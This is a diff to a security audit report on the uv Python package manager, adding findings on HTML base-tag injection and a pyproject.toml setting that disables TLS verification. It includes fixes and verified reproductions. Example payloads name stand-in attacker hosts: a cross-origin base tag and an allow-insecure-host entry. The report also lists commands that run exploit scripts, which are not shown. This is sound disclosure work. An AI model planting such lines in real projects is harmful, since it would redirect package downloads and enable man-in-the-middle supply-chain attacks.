@@ -10,23 +10,27 @@
 
 ## Executive Summary
 
-This audit identified three independently verified vulnerabilities in uv, plus two defense-in-depth
+This audit identified five independently verified vulnerabilities in uv, plus two defense-in-depth
 gaps. The most critical findings are: (1) build backends inherit the full parent process
-environment, allowing malicious packages to exfiltrate sensitive credentials; and (2)
-`uv self update` downloads and executes a shell installer from `UV_ASTRAL_MIRROR_URL` without any
-hash or signature verification, enabling RCE for anyone who controls the mirror URL.
+environment, allowing malicious packages to exfiltrate sensitive credentials; (2) `uv self update`
+downloads and executes a shell installer from `UV_ASTRAL_MIRROR_URL` without any hash or signature
+verification, enabling RCE for anyone who controls the mirror URL; and (3) `allow-insecure-host` can
+be set in `pyproject.toml` (unlike proxy settings), allowing checked-in configs to silently disable
+TLS verification.
 
 ---
 
 ## Vulnerability Summary
 
-| Severity | ID          | Title                                  | Status                  |
-| -------- | ----------- | -------------------------------------- | ----------------------- |
-| **HIGH** | UV-2026-001 | Credential Leakage via Build Backends  | VERIFIED                |
-| **HIGH** | UV-2026-005 | Self-Update Installer Script Injection | VERIFIED                |
-| MEDIUM   | UV-2026-002 | GitHub API URL Injection               | VERIFIED                |
-| LOW      | UV-2026-003 | Symlink Escape in .data/scripts        | Defense-in-depth gap    |
-| INFO     | UV-2026-004 | RECORD Hash Not Validated              | By design (matches pip) |
+| Severity | ID          | Title                                         | Status                  |
+| -------- | ----------- | --------------------------------------------- | ----------------------- |
+| **HIGH** | UV-2026-001 | Credential Leakage via Build Backends         | VERIFIED                |
+| **HIGH** | UV-2026-005 | Self-Update Installer Script Injection        | VERIFIED                |
+| **HIGH** | UV-2026-006 | HTML Base Tag Injection                       | VERIFIED                |
+| **HIGH** | UV-2026-007 | pyproject.toml allow-insecure-host TLS Bypass | VERIFIED                |
+| MEDIUM   | UV-2026-002 | GitHub API URL Injection                      | VERIFIED                |
+| LOW      | UV-2026-003 | Symlink Escape in .data/scripts               | Defense-in-depth gap    |
+| INFO     | UV-2026-004 | RECORD Hash Not Validated                     | By design (matches pip) |
 
 ---
 
@@ -202,6 +206,124 @@ writing `/tmp/exploit_03_marker.txt` to prove RCE.
 
 ---
 
+### UV-2026-006: HTML Base Tag Injection (HIGH)
+
+**Location:** `crates/uv-client/src/html.rs:170-176`
+
+**Description:** The PEP 503 simple index HTML parser in uv honours the `<base href="...">` tag from
+the server response and uses it to resolve all relative package links — without validating that the
+base URL is same-origin as the index URL.
+
+An attacker who controls any PyPI mirror can embed a cross-origin
+`<base href="http://attacker.com/">` tag in the simple index page. All relative package file links
+are then resolved against the attacker URL, causing uv to download packages from the
+attacker-controlled server.
+
+**Root Cause:**
+
+```rust
+// html.rs:170-176
+fn parse_base(base: &HTMLTag) -> Result<Option<DisplaySafeUrl>, Error> {
+    let Some(href) = attribute(base, "href") else {
+        return Ok(None);
+    };
+    // Accepts ANY absolute URL — no same-origin check.
+    let url = DisplaySafeUrl::parse(&href)
+        .map_err(|err| Error::UrlParse(href.to_string(), err))?;
+    Ok(Some(url))
+}
+```
+
+`FileLocation::new()` in `crates/uv-distribution-types/src/file.rs:139-143` then joins relative
+hrefs against this attacker-controlled base URL to produce the final download URL.
+
+**Impact:** An attacker controlling a PyPI mirror (e.g., a corporate Nexus/Artifactory instance, a
+DNS-hijacked mirror, or a compromised index) can serve a simple-index page that redirects all
+package downloads to a server they control. The attacker can serve malicious packages without
+modifying any package metadata or hashes in the index itself.
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/05_base_tag_injection/run_exploit.sh
+```
+
+**Verified:** PASS. Attacker server at port 18082 received `GET /requests-2.32.0.tar.gz` after mock
+PyPI at port 18081 returned a simple-index page with `<base href="http://localhost:18082/">`.
+
+**Recommendation:**
+
+1. In `parse_base()`, validate that the parsed base URL's origin (scheme + host + port) matches the
+   origin of the index URL. Reject or warn on cross-origin base tags.
+2. Alternatively, strip or ignore `<base>` tags entirely from PEP 503 responses, since the spec does
+   not require them and they introduce unnecessary attack surface.
+
+---
+
+### UV-2026-007: pyproject.toml allow-insecure-host TLS Bypass (HIGH)
+
+**Location:** `crates/uv-settings/src/settings.rs:420-435`
+
+**Description:** The `allow-insecure-host` setting, which disables TLS certificate verification for
+specified hosts, can be declared in `pyproject.toml` under `[tool.uv]`. Unlike proxy settings
+(`http-proxy`, `https-proxy`, `no-proxy`), which are restricted to `uv.toml` via the `uv_toml_only`
+annotation, `allow-insecure-host` has no such restriction.
+
+A malicious or compromised `pyproject.toml` checked into a repository can silently grant TLS bypass
+for any host. A developer who clones the repository and runs `uv pip install` will connect to
+attacker-controlled HTTPS endpoints with certificate verification disabled — with no CLI flag and no
+visible warning.
+
+**Root Cause:**
+
+```toml
+# pyproject.toml — any project file can contain this
+[tool.uv]
+allow-insecure-host = ["attacker.example.com:443"]
+```
+
+```rust
+// settings.rs:344-360 — workspace config is loaded alongside CLI args
+let allow_insecure_host = args.allow_insecure_host
+    ...
+    .chain(
+        workspace
+            .and_then(|workspace| workspace.globals.allow_insecure_host.clone())
+            .into_iter()
+            .flatten(),
+    )
+    .collect();
+```
+
+Compare: `no-proxy` at `settings.rs:410-418` carries `uv_toml_only = true`, preventing it from being
+set in `pyproject.toml`. `allow-insecure-host` lacks this guard.
+
+**Impact:** Supply-chain attack: an attacker introduces a `pyproject.toml` change (e.g., via a
+compromised dependency, a malicious PR, or a subtly altered fork) that adds `allow-insecure-host`
+for a host they control. All developers and CI pipelines that use that project will silently bypass
+TLS verification when downloading packages, enabling MITM attacks.
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh
+```
+
+**Verified:** PASS. uv connected to an HTTPS server with a self-signed certificate (not in the
+system trust store) when run inside a project whose `pyproject.toml` contained
+`allow-insecure-host = ["localhost:8447"]`. No `--allow-insecure-host` CLI flag was passed.
+
+**Recommendation:**
+
+1. Add `uv_toml_only = true` to `allow-insecure-host` in `settings.rs`, preventing it from being set
+   in `pyproject.toml`. Users who need this setting should configure it in `uv.toml` or via the
+   CLI/environment variable `UV_INSECURE_HOST`.
+2. Emit a warning when `allow-insecure-host` is loaded from `pyproject.toml` rather than `uv.toml`.
+3. Consider adding it to the list of security-sensitive settings that are masked in debug output (it
+   is already partially handled in `lib.rs:507-508`).
+
+---
+
 ### UV-2026-003: Symlink Escape in .data/scripts (LOW)
 
 **Location:** `crates/uv-install-wheel/src/wheel.rs:453-467`
@@ -280,6 +402,12 @@ bash autofyn_audit/exploits/02_github_url_injection/run_exploit.sh
 
 # Exploit 3: Self-Update Installer Script Injection
 bash autofyn_audit/exploits/03_self_update_injection/run_exploit.sh
+
+# Exploit 4: HTML Base Tag Injection
+bash autofyn_audit/exploits/05_base_tag_injection/run_exploit.sh
+
+# Exploit 5: pyproject.toml allow-insecure-host TLS Bypass
+bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh
 ```
 
 ---
@@ -335,3 +463,15 @@ bash autofyn_audit/exploits/03_self_update_injection/run_exploit.sh
   verification
 - `crates/uv/src/commands/self_update.rs:367-374` — `execute_official_installer()` immediately after
   download
+
+### UV-2026-006 (HTML Base Tag Injection)
+
+- `crates/uv-client/src/html.rs:170-176` — `parse_base()` accepts any URL, no same-origin check
+- `crates/uv-distribution-types/src/file.rs:139-143` — `FileLocation::new()` joins relative URLs
+  against attacker-controlled base
+
+### UV-2026-007 (pyproject.toml allow-insecure-host)
+
+- `crates/uv-settings/src/settings.rs:420-435` — `allow-insecure-host` lacks `uv_toml_only`
+- `crates/uv-settings/src/settings.rs:410-418` — `no-proxy` has `uv_toml_only = true` (contrast)
+- `crates/uv/src/settings.rs:344-360` — workspace globals loaded alongside CLI args
